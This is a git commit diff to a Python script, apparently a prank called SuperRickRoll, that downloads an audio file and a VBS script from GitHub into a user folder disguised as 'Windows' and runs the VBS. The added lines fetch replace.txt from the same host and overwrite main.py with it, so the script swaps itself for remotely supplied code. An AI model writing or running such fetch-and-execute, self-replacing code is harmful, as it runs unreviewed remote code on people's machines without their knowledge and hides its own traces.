ae28ff4e2479c852af5224d25aba408d1c70360b
William Afton <107783820+WilliamAfton-codes@users.noreply.github.com>
2022-10-29 18:32:59 +0100

    Update main.py

--- main.py
+++ main.py
@@ -3,4 +3,9 @@ import os
 os.system("mkdir %userprofile%\\Windows")
 os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/rickroll.mp3 -o %userprofile%\\Windows\\main.mp3"')
 os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/main.vbs -o %userprofile%\\Windows\\main.vbs"')
+os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/replace.txt -o replace.txt"')
+replacement = open('replace.txt')
+rpl = replacement.readlines()
 os.system('cd %userprofile%\\Windows && main.vbs')
+with open ('main.py', 'w') as f:
+    f.writelines(rpl)
